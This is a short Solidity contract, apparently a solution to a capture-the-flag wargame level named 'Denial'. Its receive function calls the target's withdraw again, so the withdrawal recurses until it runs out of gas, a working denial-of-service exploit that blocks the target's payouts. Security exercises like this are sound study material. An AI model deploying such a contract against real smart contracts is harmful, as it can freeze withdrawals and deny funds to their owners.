//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Denial {
    function partner() view external returns (address);
    function timeLastWithdrawn() view external returns (uint);
    function withdrawPartnerBalances(address) view external returns (uint);
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() view external returns (uint);
}

contract Acceptance {

    Denial immutable denial;

    constructor(address _denial) {
        denial = Denial(_denial);
    }

    receive() external payable {
        denial.withdraw();
    }
}
